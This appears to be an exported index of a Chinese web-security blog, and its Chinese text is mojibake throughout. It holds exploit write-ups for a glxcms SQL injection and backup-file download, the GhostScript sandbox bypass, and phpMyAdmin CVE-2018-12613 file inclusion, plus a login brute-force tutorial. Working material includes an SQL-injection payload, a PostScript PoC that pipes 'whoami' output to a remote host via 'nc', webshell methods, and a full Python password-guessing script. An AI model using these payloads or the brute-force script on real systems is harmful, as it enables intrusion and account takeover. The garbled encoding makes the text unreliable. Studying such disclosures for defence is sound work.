¼è®¾è®¡ï¼Œè®©ä½ å¯ä»¥éšæ„æŠŠå›¾ç‰‡æ°´å°åŠ åˆ°ä»»æ„åœ°æ–¹5.æ•°æ®åº“ä¸€é”®å¤‡ä»½/è¿˜åŸï¼Œè®©ä½ å¯ä»¥è½»æ¾çš„æŠŠç½‘ç«™è¿ç§»åˆ°ä»»ä½•æœåŠ¡å™¨ä¸Š6.ç¼“å­˜åŠŸèƒ½ï¼šæ¨¡æ¿ç¼“å­˜ï¼Œæ•°æ®åº“ç¼“å­˜ï¼Œç½‘ç«™é¡µé¢ç¼“å­˜7.å‹æƒ…é“¾æ¥ï¼šæ”¯æŒå›¾ç‰‡é“¾æ¥å’Œæ–‡å­—é“¾æ¥8.å¹¿å‘Šæ¨¡å—ï¼šåªè¦åå°æ·»åŠ å¹¿å‘Šåï¼Œå…¨éƒ¨jsç”Ÿæˆåˆ°å‰å°ï¼Œè®©ä½ ä¸ç”¨è´¹äº‹ä¿®æ”¹æ¨¡æ¿9.é‡‡é›†åŠŸèƒ½ï¼Œæˆ‘ä»¬æ”¯æŒç«è½¦å¤´é‡‡é›†ï¼Œç«è½¦å¤´æ¥å£å·²ç»åœ¨æ’ä»¶ä¸­å¿ƒé‡Œé¢ï¼Œåªéœ€è¦ä½ ä¸‹è½½åï¼Œå°±å¯ä»¥é‡‡é›†ä¸Šä¸‡æ–°é—»å†…å®¹ï¼Œä¸ºäº†é˜²æ­¢é‡åæ–°é—»ï¼Œæˆ‘ä»¬å¯¹æ¥å£åšäº†ç»†è…»åŒ–çš„åŠŸèƒ½ï¼Œæ”¯æŒå…¥åº“é‡ååˆ¤æ–­ï¼Œå½“æœ‰é‡åæ–°é—»è‡ªåŠ¨è¿‡æ»¤10.æ‰©å±•åŠŸèƒ½ï¼šæ‰©å±•æ€§ï¼Œå¯ä»¥åœ¨æ’ä»¶ä¸­å¿ƒä¸‹è½½ï¼Œæ‹›è˜æ¨¡å—ï¼Œå›¾é›†æ¨¡å—ï¼Œä¼šå‘˜ä¸­å¿ƒæ¨¡å—ï¼Œäº¤å‹æ¨¡å—ç­‰ç­‰æ¨¡å—è¿›è¡Œå®‰è£…ï¼ˆå¼€å‘ä¸­ï¼‰æºç ä¸‹è½½åœ°å€:Demoåœ°å€ï¼šå®˜ç½‘æ›´æ–°è¡¥ä¸é“¾æ¥ï¼šå¾…è¡¥å…… æ¼æ´è¯¦æƒ…ï¼š1ã€åå°sqlæ³¨å…¥æ¼æ´(CVE-2018-18488)æ¼æ´åˆ†æä»\lib\admin\action\dataaction.class.phpæ–‡ä»¶ä¸­å¤„ç†æ•°æ®åº“å¤‡ä»½æ–¹æ³•å¯çŸ¥ï¼š$tableæ˜¯ä»$_POST[â€˜idsâ€™]ä¸­ä¼ å…¥ï¼Œä¸”å¯æ§ã€‚ç„¶åï¼Œåœ¨32è¡Œä»£ç ä¸­ä¸TRUNCATE TABLE æ‹¼æ¥å­˜å…¥sqlæ–‡ä»¶ï¼Œç„¶ååœ¨åç»­å¯¼å…¥è¿˜åŸåŠŸèƒ½ä¸­æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ§åˆ¶ç”Ÿæˆçš„sqlæ–‡ä»¶ï¼Œå¹¶ä¸”æ‰§è¡Œä»»æ„sqlè¯­å¥ã€‚æ„é€ sqlæ³¨å…¥è¯­å¥ï¼š12ids%5B%5D=gxl_actor`;select sleep(3);--%20 æˆ‘ä»¬å‘é€æ•°æ®åŒ…åï¼Œç”Ÿæˆçš„sqlæ–‡ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼šç„¶ååœ¨è¿›è¡Œå¤‡ä»½è¿˜åŸï¼šå¯çœ‹åˆ°å»¶è¿Ÿï¼Œæˆ‘ä»¬æ³¨å…¥select sleep(1)åé€šè¿‡sqlå¤‡ä»½è¿˜åŸåŠŸèƒ½æ‰§è¡Œsqlæ–‡ä»¶ï¼šå› æ­¤åˆ¤æ–­å­˜åœ¨æ³¨å…¥ã€‚ ä¿®å¤å»ºè®®ï¼šå¯¹idså‚æ•°å€¼è¿›è¡Œè¿‡æ»¤ 2ã€å‰å°ä»»æ„sqlå¤‡ä»½æ–‡ä»¶ä¸‹è½½ï¼š(CVE-2018-18487)æ¼æ´åˆ†æä»\lib\admin\action\dataaction.class.phpæ–‡ä»¶ä¸­å¤„ç†æ•°æ®åº“å¤‡ä»½æ–¹æ³•å¯çŸ¥ç”Ÿæˆå¤‡ä»½æ–‡ä»¶çš„æ–¹æ³•å¦‚ä¸‹ï¼šçœ‹åˆ°mt_randå‡½æ•°ï¼š ç„¶åç»“åˆcmsçš„sqlæ–‡ä»¶ç”Ÿæˆä»£ç :Sqlæ–‡ä»¶åå­—ï¼šå¹´æœˆæ—¥_éšæœºæ•°_1.sql é€šè¿‡éšæœºæ•°å€¼æ¥çˆ†ç ´ç§å­çš„è¿‡ç¨‹ï¼Œå¤–å›½æœ‹å‹å†™äº†ä¸€ä¸ªå·¥å…·ï¼šphp_mt_seedï¼ˆå®˜æ–¹ä½¿ç”¨è¯´æ˜ï¼šhttp://www.openwall.com/php_mt_seed/README ï¼‰ã€‚ä½¿ç”¨å·¥å…·è·å¾—éšæœºæ•°ï¼Œæ‹¼æ¥sqlæ–‡ä»¶åç§°ã€‚ç„¶ååœ¨ç®¡ç†å‘˜æœªä¿®æ”¹æºç ç›®å½•çš„æƒ…å†µä¸‹è®¿é—®é»˜è®¤è·¯å¾„å³å¯æœªæˆæƒä¸‹è½½å¤‡ä»½çš„sqlæ–‡ä»¶ï¼š ä¿®å¤å»ºè®®ï¼šå¯å‚è€ƒphpcmså°äºV9.6.2 authkeyæ³„éœ²çš„ä¿®å¤æ–¹å¼åœ¨æ¯æ¬¡ç”Ÿæˆéšæœºæ•°ä¹‹å‰éƒ½æ‰‹åŠ¨æ’­ç§ä¸€æ¬¡ï¼Œæˆ–è€…é‡‡ç”¨æ—¶é—´æˆ³çš„æ–¹å¼ã€‚ å‚è€ƒé“¾æ¥ï¼šhttps://xz.aliyun.com/t/31]]></content>
      <categories>
        <category>WEBå®‰å…¨</category>
      </categories>
      <tags>
        <tag>æ¼æ´æŠ«æ¼</tag>
        <tag>glxcms</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GhostScriptæ²™ç®±ç»•è¿‡]]></title>
    <url>%2F2018%2F08%2F23%2F23%2F</url>
    <content type="text"><![CDATA[èƒŒæ™¯8 æœˆ 21 å·ï¼ŒTavis Ormandy é€šè¿‡å…¬å¼€é‚®ä»¶åˆ—è¡¨ï¼Œå†æ¬¡æŒ‡å‡º ghostscript çš„å®‰å…¨æ²™ç®±å¯ä»¥è¢«ç»•è¿‡ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„å›¾ç‰‡å†…å®¹ï¼Œå¯é€ æˆå‘½ä»¤æ‰§è¡Œã€‚ghostscriptåº”ç”¨å¹¿æ³›ï¼ŒImageMagickã€python-matplotlibã€libmagick ç­‰å›¾åƒå¤„ç†åº”ç”¨å‡æœ‰å¼•ç”¨ã€‚åœ¨ghostscriptä¸­ç”±äºä»¥å¾€çš„å®‰å…¨äº‹ä»¶ï¼Œé’ˆå¯¹å®‰å…¨é—®é¢˜gså®˜æ–¹é‡‡ç”¨å¢åŠ å‚æ•°-dSAFERæ¥å¼€å¯å®‰å…¨æ²™ç®±ï¼Œä½†è¯¥æ²™ç®±åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ç”±LockSafetyParamsè¿™ä¸ªå€¼è¿›è¡Œæ§åˆ¶ï¼Œæ­¤æ¬¡Tavisoå‘ç°é€šè¿‡restoreæ“ä½œä¼šå°†è¯¥å€¼æˆåŠŸè¦†ç›–ï¼Œå¯¼è‡´å®‰å…¨æ²™ç®±è¢«ç»•è¿‡ï¼Œå¼•å‘å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ å¤ç°ï¼šæµ‹è¯•ï¼švpså¼€å¯ç›‘å¬ç«¯å£åï¼Œå¯¹å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½è¿›è¡Œæµ‹è¯•ï¼Œä¸Šä¼ å«æœ‰æ”»å‡»æ•°æ®çš„å›¾ç‰‡ï¼š æœåŠ¡å™¨æ”¶åˆ°å›æ˜¾ï¼š pocï¼š12345678%!PSuserdict /setpagedevice undefsavelegal&#123; null restore &#125; stopped &#123; pop &#125; if&#123; legal &#125; stopped &#123; pop &#125; ifrestoremark /OutputFile (%pipe%whoami|nc ip port) currentdevice putdeviceprops æ¼æ´å½±å“ï¼šversion &lt;= 9.23ï¼ˆå…¨ç‰ˆæœ¬ã€å…¨å¹³å°ï¼‰æ‰€æœ‰å¼•ç”¨ghostscriptçš„ä¸Šæ¸¸åº”ç”¨å¦‚ï¼šimagemagicklibmagickgraphicsmagickgimppython-matplotlibtexlive-coretexmacslatex2htmllatex2rtfç­‰ ç¼“è§£æªæ–½ï¼š1ã€å¸è½½ghostscriptã€‚2ã€ä½¿ç”¨ImageMagickï¼Œå»ºè®®ä¿®æ”¹policyæ–‡ä»¶ã€‚ï¼ˆé»˜è®¤ä½ç½®ï¼š/etc/ImageMagick/policy.xmlï¼‰ï¼Œåœ¨ ä¸­åŠ å…¥ä»¥ä¸‹ ï¼ˆå³ç¦ç”¨ PSã€EPSã€PDFã€XPS codersï¼‰ å‚è€ƒä¿¡æ¯ï¼š1ã€æ¼æ´åˆ†æï¼šhttps://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247485615&amp;idx=1&amp;sn=b25c47324b771266c0d62cb46c263f42&amp;chksm=fe250daec95284b81a882aeecf36a50e39d8fb7e7e82ac4affd16b7f60ddb6741c99aeb851b3&amp;scene=21#wechat_redirect2ã€é‚®ä»¶åˆ—è¡¨ï¼šhttps://bugs.chromium.org/p/project-zero/issues/detail?id=1640]]></content>
      <categories>
        <category>WEBå®‰å…¨</category>
      </categories>
      <tags>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>GhostScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-12613æ¼æ´å­¦ä¹ æ€»ç»“]]></title>
    <url>%2F2018%2F07%2F25%2F22%2F</url>
    <content type="text"><![CDATA[å‰è¨€ï¼šåœ¨æ¼æ´æŠ«æ¼ä¹‹åï¼Œå°±å¯¹è¯¥æ¼æ´è¿›è¡Œäº†åˆ†æå¤ç°ï¼Œæœ¬æ¥æ‰“ç®—æŠ•freebufï¼Œè°çŸ¥é“è¢«æŠ¢äº†å…ˆ2333ï¼Œè´´å›¾ç•™å¿µï½ï½ï½ CVE-2018-12613ï¼š2018å¹´6æœˆ19æ—¥ï¼ŒphpMyAdminåœ¨æœ€æ–°ç‰ˆæœ¬ä¿®å¤äº†ä¸€ä¸ªä¸¥é‡çº§åˆ«çš„æ¼æ´ã€‚æ”»å‡»è€…å¿…é¡»æ‹¥æœ‰åå°æƒé™ï¼ŒphpMyAdmin4.8.0å’Œ4.8.1å‡å—æ¼æ´å½±å“ã€‚ æ¼æ´åˆ†æï¼š é¦–å…ˆåœ¨å¦‚ä¸‹å›¾æ‰€ç¤ºçš„index.phpä¸­å­˜åœ¨ä¸€å¤„åŒ…å«æŒ‡å®šæ–‡ä»¶çš„ä»£ç ï¼š éœ€è¦æˆåŠŸåŒ…å«ï¼Œå¿…é¡»æ»¡è¶³ifåŒºé—´ä¸­çš„äº”ä¸ªæ¡ä»¶ï¼štargetå‚æ•°å€¼ä¸ä¸ºç©ºï¼›targetå‚æ•°å€¼ä¸ºå­—ç¬¦ä¸²ï¼›targetå‚æ•°å€¼ä¸ä»¥indexå¼€å¤´ï¼›targetå‚æ•°å€¼ä¸åœ¨é»‘åå•ä¸­ï¼›è¿‡checkPageValidityå‡½æ•°çš„æ£€æŸ¥ã€‚å…¶ä¸­ç¬¬å››ä¸ªæ¡ä»¶çš„é»‘åå•å³51è¡Œä¸­import.phpä¸export.phpï¼›ç¬¬äº”ä¸ªæ¡ä»¶éœ€è¦æŸ¥çœ‹è¯¥å‡½æ•°ï¼š å¯ä»¥çœ‹åˆ°coreç±»çš„checkPageValidityå‡½æ•°ä¸­åˆå¿…é¡»ç»è¿‡ä»¥ä¸‹çš„äº”ä¸ªåˆ¤æ–­ï¼š1ã€$whitelistä¸ºç©ºå°±å¼•ç”¨ç”³æ˜çš„$goto_whitelist2ã€$pageå¦‚æœæ²¡æœ‰å®šä¹‰æˆ–è€…$pageä¸ä¸ºå­—ç¬¦ä¸²å°±è¿”å›false3ã€$pageå¦‚æœå­˜åœ¨åœ¨$whitelistä¸­è¿”å›true4ã€å¦‚æœ$_pageå­˜åœ¨åœ¨$whitelistä¸­è¿”å›true5ã€ç»è¿‡urldecodeå‡½æ•°è§£ç åçš„$_pageå­˜åœ¨åœ¨$whitelistä¸­è¿”å›trueæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨index.phpè°ƒç”¨checkPageValidityå‡½æ•°æ—¶æ²¡æœ‰ä¼ å…¥å…¶ä»–å‚æ•°ï¼Œå› æ­¤ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œè€Œ$goto_whitelistå¦‚ä¸‹æ‰€ç¤ºï¼š å®ƒå®šä¹‰äº†å¾ˆå¤šå¯ä»¥è¢«åŒ…å«çš„æ–‡ä»¶åã€‚ç„¶åç¬¬äºŒä¸ªåˆ¤æ–­å¯ä»¥è·³è¿‡ï¼›çœ‹ç¬¬ä¸‰ä¸ªåˆ¤æ–­ï¼Œå¯ä»¥çœ‹åˆ°$pageå‚æ•°æ˜¯ä¸åœ¨$whitelistä¸­çš„ï¼Œæ­¤å¤„ä¸æ»¡è¶³ï¼›çœ‹ç¬¬å››ä¸ªåˆ¤æ–­ï¼Œè¿™ä¸ªåˆ¤æ–­æ˜¯å¯¹$_pageè¿›è¡Œçš„ï¼Œæ ¡éªŒ$_pageæ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œè€Œ$_pageæ˜¯å°†$pageå€¼æœ«å°¾åŠ ä¸Šâ€™?â€™åä»å­—ç¬¦ä¸²ç¬¬0ä½å¼€å§‹åˆ†å‰²ï¼Œå–å…¶ä¸­ç¬¬ä¸€æ¬¡å‡ºç°?ä¹‹å‰çš„å†…å®¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼štarget=sql.ph%3fpæ—¶ï¼š å› æ­¤æ­¤å¤„å¯ä»¥ç”¨â€™$target=db_sql.php?/../../è¢«åŒ…å«æ–‡ä»¶â€™æ¥æ»¡è¶³æ¡ä»¶ï¼Œä½†æ˜¯$targetè¿›å…¥åˆ°index.phpçš„include()ä¸­ï¼Œè¢«åŒ…å«çš„æ–‡ä»¶æ— æ³•æ‰“å¼€ï¼Œå‡ºç°æŠ¥é”™ã€‚ï¼ˆwindowsæ–‡ä»¶å‘½åè§„åˆ™ä¸­è§„å®šäº†æ–‡ä»¶åä¸èƒ½å‡ºç°ç‰¹æ®Šå­—ç¬¦ï¼Œlinuxä¸ºæœåŠ¡å™¨çš„æƒ…å†µä¸‹ï¼Œæ˜¯å¯ä»¥ä½¿ç”¨ï¼Ÿç›´æ¥è¿›è¡Œç»•è¿‡ï¼‰ ç¬¬äº”ä¸ªåˆ¤æ–­ï¼Œå…ˆå°†$pageè¿›è¡Œurldecodeè§£ç ï¼Œç„¶åå†è¿›è¡Œï¼Ÿçš„åˆ†å‰²ï¼Œå–å€¼è¿›è¡Œåˆ¤æ–­ï¼Œåªè¦è§£ç ååˆ†å‰²å‡ºæ¥çš„å€¼åœ¨$whitelistä¸­å³å¯æ»¡è¶³æ¡ä»¶ã€‚è€Œåœ¨$target é‡Œé—®å·è¢«äºŒæ¬¡ç¼–ç ä¸º%253fï¼Œ db_sql.php%253fä¹Ÿä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªç›®å½•ï¼Œå¯ä»¥ç”¨../è·¨è¶Šï¼ŒæˆåŠŸå®ç°åŒ…å«ã€‚å› æ­¤å‘½åè§„èŒƒé‡Œé¢æ²¡æœ‰å°†%æ”¾è¿›å»ä¹Ÿæ˜¯è¯¥æ¼æ´èƒ½åœ¨windowsä¸‹æˆåŠŸåˆ©ç”¨çš„ä¸€ä¸ªå…³é”®ç‚¹ã€‚ è¿™æ ·æˆ‘ä»¬å¯ä»¥å°†ï¼Ÿè¿›è¡ŒäºŒæ¬¡ç¼–ç ã€‚å¦‚æœä¼ å…¥target=db_sql.php%253fã€‚åœ¨ç¬¬å››ä¸ªåˆ¤æ–­ä¸­è¿›è¡Œç™½åå•æ ¡éªŒæ—¶ï¼Œä¸ºdb_sql.php%3fï¼Œä¸æ»¡è¶³ï¼Œç¬¬äº”ä¸ªåˆ¤æ–­çš„urldecodeåï¼Œè¿›è¡Œæ ¡éªŒæ—¶ä¸ºdb_sql.php,ç¬¦åˆæ¡ä»¶ï¼Œç„¶åå³å¯æˆåŠŸåŒ…å«æ–‡ä»¶ã€‚ å¤ç°å¿ƒå¾—ï¼šgetshellæ–¹å¼ 1ã€ä¸Šä¼ sqlæ–‡ä»¶ï¼Œç„¶åè¿›è¡ŒåŒ…å«ã€‚2ã€å¼€å¯webshellæ—¥å¿—åŠŸèƒ½ï¼ŒæŸ¥è¯¢webshellè¯­å¥åï¼ŒåŒ…å«æ—¥å¿—ã€‚3ã€å°†webshellå†™å…¥å­—æ®µä¸­ï¼Œå¦‚æœæ•°æ®åº“åœ¨æœ¬åœ°ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æŸ¥è¯¢æ•°æ®åº“æ–‡ä»¶ä½ç½®ï¼šselect @@datadirï¼›ç„¶åå¾—åˆ°æ•°æ®åº“æ–‡ä»¶å­˜æ”¾è·¯å¾„ï¼Œè€Œå­—æ®µå†…å®¹åˆ™åœ¨æ•°æ®åº“å/è¡¨å.frmä¸­ è¯´æ˜å›¾1ï¼š è¯´æ˜å›¾2ï¼š 4ã€é€šè¿‡phpsessionæ–‡ä»¶åŒ…å«ï¼Œé¦–å…ˆæ‰§è¡ŒæŸ¥æ‰¾webshellçš„è¯­å¥ï¼Œç„¶ååœ¨cookieä¸­çš„phpmyadminå‚æ•°ä¸­å¯çœ‹åˆ°sessionæ–‡ä»¶åã€‚è¯´æ˜å›¾1ï¼š è¯´æ˜å›¾2 getshellæ–¹å¼ï¼š ç›®å‰å®˜æ–¹å·²ä¿®å¤æ¼æ´ï¼Œæ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬å¯ä¸å—æ­¤æ¼æ´å½±å“ã€‚]]></content>
      <categories>
        <category>WEBå®‰å…¨</category>
      </categories>
      <tags>
        <tag>phpmyadmin</tag>
        <tag>æ¼æ´æ€»ç»“</tag>
        <tag>CVE-2018-12613</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•å¯¹ç»å‰ç«¯åŠ å¯†åçš„æ•°æ®è¿›è¡Œçˆ†ç ´]]></title>
    <url>%2F2018%2F07%2F23%2F21%2F</url>
    <content type="text"><![CDATA[1.1 ç®€è¿°ï¼šæœ€è¿‘é‡åˆ°ä¸¤ä¸ªä¸ªæ¡ˆä¾‹ï¼Œç»è¿‡ä¸€ç•ªå€’è…¾ï¼Œå‘ç°å…¶ç™»å½•åŠŸèƒ½å‡å¯æ’åº“ã€‚ä½†æ˜¯éƒ½å­˜åœ¨ç™»å½•æ•°æ®æœ¬åœ°åŠ å¯†ï¼Œæœ‰ç©ºäº†æ”¾ä¸€èµ·æ€»ç»“è®°å½•ä¸€ä¸‹ã€‚ 2.1 æ¡ˆä¾‹1(RSAæœ¬åœ°åŠ å¯†):2.1.1 æ‘¸åº•ï¼š é¦–å…ˆï¼Œè¿›è¡Œæ­£å¸¸ç™»å½•é€»è¾‘æµ‹è¯•ï¼Œå‘ç°è¯¥ç³»ç»Ÿç™»å½•é€»è¾‘åˆ†ä¸‹é¢ä¸¤æ­¥ï¼š1ã€è¾“å…¥æ­£ç¡®ç”¨æˆ·åå¯†ç ï¼Œæ ¡éªŒæ­£ç¡®åï¼Œå‘æ³¨å†Œæ‰‹æœºå·å‘é€éªŒè¯ç ã€‚2ã€è¾“å…¥æ­£ç¡®éªŒè¯ç ï¼Œç™»å½•ç³»ç»Ÿã€‚ ä»è¯¥é€»è¾‘å¯çŸ¥æ­¤å¤„å¯é€šè¿‡å¡«å†™ç™»å½•ç”¨æˆ·åå¯†ç åæ˜¯å¦å‘é€éªŒè¯ç æ¥åˆ¤æ–­è¾“å…¥æ•°æ®æ˜¯å¦ä¸ºæ­£ç¡®ç”¨æˆ·ç™»å½•å‡­è¯ï¼Œç”±äºç«™ç‚¹æœªå¯¹è·å–éªŒè¯ç æäº¤é¢‘ç‡ä½œä»»ä½•é™åˆ¶ï¼Œä»è€Œå¯è‡ªåŠ¨åŒ–æäº¤æ¥è·å–è¯¥ç«™ç‚¹æ­£ç¡®ç”¨æˆ·åå¯†ç ã€‚ 2.1.2 æ¼”ä¹ ï¼š åœ¨googleçš„è¿‡ç¨‹ä¸­ï¼Œå¾ˆå¿«çš„æ‰¾åˆ°äº†ä¸€æ¬¾burpsuiteå¥—ä»¶ï¼šjsEncrypterï¼ˆæ„Ÿè°¢ä½œè€…æä¾›è¿™ä¹ˆåˆ©ç´¢çš„æ’ä»¶ï¼‰ã€‚ä¸‹è½½åœ°å€ï¼šhttps://github.com/c0ny1/jsEncrypter/releasesã€‚å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬å°†jsencrypt.min.jsä¸‹è½½è‡³æœ¬åœ°ã€‚ç„¶åå¯¹ç«™ç‚¹ç³»ç»Ÿå‰ç«¯ä»£ç è¿›è¡Œè°ƒè¯•ï¼Œåˆ†æå‰ç«¯å¤„ç†è¿‡ç¨‹ï¼Œç¼–å†™jsæ¨¡æ¿æ–‡ä»¶ã€‚ å¯¹ç™»å½•è¿‡ç¨‹è¿›è¡Œè°ƒè¯•ï¼š åœ¨å®¡è®¡å‰ç«¯æºä»£ç é¡µé¢ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°ï¼Œåœ¨uiç›®å½•ä¸‹çš„libæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ªsecurityæ–‡ä»¶å¤¹ï¼Œè€Œå…¶ä¸­çš„rsa_util.jså°±æ˜¯è°ƒç”¨jsencrypt.min.jsæ–‡ä»¶ç§çš„JSEncryptæ–¹æ³•å¯¹ç”¨æˆ·åå¯†ç è¿›è¡ŒåŠ å¯†ã€‚ ä¸‹å›¾ä¸ºåŠ¨æ€è°ƒè¯•ç»“æœï¼š æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ¥šçœ‹åˆ°åŠ å¯†è¿‡ç¨‹ï¼Œç„¶åæ ¹æ®jsEncrypterçš„readmeæ–‡æ¡£ä¸­çš„ä½¿ç”¨æŒ‡å—ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®å…¶è°ƒç”¨é€»è¾‘ï¼Œè‡ªè¡Œç¼–å†™ä¸€ä¸ªjsEncrypter_rsa.jsæ–‡ä»¶ï¼Œæ¥è°ƒç”¨jsencrypt.min.jsæ–‡ä»¶ä¸ºæˆ‘ä»¬çš„æ˜æ–‡æ•°æ®è¿›è¡ŒåŠ å¯†ã€‚ è¿™é‡Œæœ‰ä¸¤ä¸ªå°å‘ï¼š 1ã€ç”±åŠ¨æ€è°ƒè¯•å¯çŸ¥ï¼Œå…¬é’¥_pubkåœ¨cookieä¸­ä»¥urlç¼–ç åçš„æ–¹å¼å­˜å‚¨ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬æœ¬åœ°è°ƒç”¨ï¼Œéœ€è¦è§£ç ä¸€ä¸‹ï¼Œåœ¨è¿™é‡Œï¼Œå¯¹äºæ¢è¡Œç¬¦ï¼Œéœ€è¦ç”¨\næ›¿æ¢ã€‚2ã€ç”±äºjsEncrypteræ’ä»¶ä½¿ç”¨äº†phantomjså¹³å°ï¼Œè€Œphantomjsæ”¯æŒurlè§£ç çš„å‡½æ•°ä¸ºencodeURIComponentã€‚å› æ­¤ä¸èƒ½ä½¿ç”¨ä¸ç³»ç»Ÿå‰ç«¯ä¸€è‡´çš„encodeURIå‡½æ•°ã€‚ ç„¶åä»¿å†™ç³»ç»ŸåŠ å¯†çš„æ–¹å¼ï¼Œå°†å…¬é’¥ä»¥åŠè°ƒç”¨é€»è¾‘å†™å…¥åˆ°æˆ‘ä»¬è‡ªå·±çš„jsæ–‡ä»¶ä¸­ï¼š 2.1.3 æ”»å‡»ï¼š1ã€è¿è¡ŒphantomJSå¹¶æµ‹è¯• 2ã€BurpsuiteéªŒè¯ï¼Œè°ƒç”¨æˆåŠŸï¼š 3ã€æŠ“åŒ…ï¼ŒåŠ è½½å­—å…¸ï¼Œå®æ–½çˆ†ç ´ï¼šï¼ˆä¸¤ä¸ªå‚æ•°çš„å­—å…¸éƒ½ä½¿ç”¨æ’ä»¶ï¼‰ ç„¶åï¼ŒæˆåŠŸçˆ†ç ´: 2.2 æ¡ˆä¾‹2(md5æœ¬åœ°åŠ å¯†):2.2.1 æ‘¸åº•ï¼š é¦–å…ˆé€šè¿‡åˆ†æç”¨æˆ·ç™»å½•è¿‡ç¨‹ï¼Œå‘ç°è¯¥ç«™ç‚¹ç™»å½•æ— éªŒè¯ç ï¼Œå¯å¤šæ¬¡æäº¤ç™»å½•æ•°æ®ï¼Œä½†æ˜¯å…¶ç”¨æˆ·åå¯†ç åœ¨æœ¬åœ°è¿›è¡Œäº†md5åŠ å¯†å¤„ç†ã€‚å› æ­¤ï¼Œæ’åº“ä¹‹å‰éœ€è¦æœ¬åœ°å®ç°å°†å­—å…¸è¿›è¡ŒåŠ å¯†æ“ä½œåå†æäº¤ã€‚å¯¹ç™»å½•åŠŸèƒ½æŠ“åŒ…åˆ†æåï¼Œå¯ä»¥çœ‹åˆ°åœ¨å¡«å†™ç”¨æˆ·åå¯†ç åï¼Œå‰ç«¯å‘é€å¦‚ä¸‹æ•°æ®åŒ…è·å–cdã€saltæ•°æ®åŒ…ï¼š æ­¤å¤„å­˜åœ¨saltæ³„æ¼é£é™©ï¼Œå¯éå†æ‰‹æœºå·ï¼Œå¯¹äºæœªæ³¨å†Œâ½¤ç”¨æˆ·ï¼Œè¿”å›å€¼â½†saltï¼Œå¯¹äºå·²æ³¨å†Œâ½¤æˆ·saltå€¼æ’å®šã€‚è€Œå®æ–½æ’åº“ï¼Œéœ€è¦å…ˆè¯·æ±‚å¾—åˆ°saltä¸cdå€¼ã€‚ ç„¶åå¯ä»å‰ç«¯ä»£ç ä¸­å¾—åˆ°åŠ å¯†ç”¨æˆ·åå¯†ç è¿‡ç¨‹ï¼š passç»è¿‡æœ¬åœ°md5åŠ å¯†åï¼Œ å‘é€è‡³æœåŠ¡ç«¯è¿›è¡Œç™»å½•æ ¡éªŒã€‚ 2.2.2 æ¼”ä¹ ï¼šå› æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¦ç”¨è„šæœ¬ï¼Œå…ˆè¾“å…¥ç”¨æˆ·åå³æ‰‹æœºå·ï¼Œè¯·æ±‚å¾—åˆ°cdã€saltå€¼ï¼Œç„¶åå†ä»å¯†ç å­—å…¸ä¸­ï¼Œå–å‡ºå¯†ç è¿›è¡Œmd5åŠ å¯†ï¼Œæœ€åå‘åŒ…è¯·æ±‚å³å¯ã€‚ç¼–å†™pythonè„šæœ¬å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#-*- coding=utf-8 -*-import requestsimport hashlibimport jsondef GetPass(): fp = open(&quot;./pass.txt&quot;,&quot;r&quot;) if fp == 0: print (&quot;open file error!&quot;) return; while 1: line = fp.readline() if not line: break passwd = line.strip(&apos;\n&apos;) Brute_Force_Dididai(&quot;150****1403&quot;,passwd);def Brute_Force_Dididai(username,password): # url = &quot;&quot; s = requests.Session() s.headers = &#123; &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/51.0.2704.103 Safari/537.36&apos;, &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;, &#125; url = &quot;http://www.foo.com/?m=&amp;s=getcd&quot; data = &#123;&quot;username&quot;:username&#125; html = s.post(url,data = data) print html.content salt_cd = json.loads(html.content) print salt_cd[&apos;salt&apos;] print salt_cd[&apos;cd&apos;] md5_pass = hashlib.md5(password.encode(&apos;utf-8&apos;)).hexdigest()+salt_cd[&apos;salt&apos;] md5_salt = hashlib.md5(md5_pass.encode(&apos;utf-8&apos;)).hexdigest()+str(salt_cd[&apos;cd&apos;]) md5_cd = hashlib.md5(md5_salt.encode(&apos;utf-8&apos;)).hexdigest() print md5_cd url1 = &quot;http://www.foo.com/?m=&amp;s=login_wd&amp;ismd5=1&quot; data1 = &#123;&quot;username&quot;:&quot;username&quot;,&quot;password&quot;:md5_cd&#125; html1 = s.post(url1,data = data1) print html1.content print len(html1.content);GetPass() ç„¶åå‡†å¤‡æµ‹è¯•pass.txt: 2.2.3 æ”»å‡»ï¼šæœ€ååªéœ€è¦æ‰§è¡Œè„šæœ¬å³å¯ï¼š æœ€åæ˜¯çˆ†ç ´æˆåŠŸè¿”å›åˆ°æ•°æ®åŒ…ï¼Œç”±æ­¤å¯å¾—åˆ°æ­£ç¡®ç”¨æˆ·åå¯†ç ã€‚freebufåœ°å€http://www.freebuf.com/articles/web/184455.html]]></content>
      <categories>
        <category>WEBå®‰å…¨</category>
      </categories>
      <tags>
        <tag>çˆ†ç ´</tag>
        <tag>jsåŠ å¯†</tag>
      </tags>
  </entry>
  <entry>
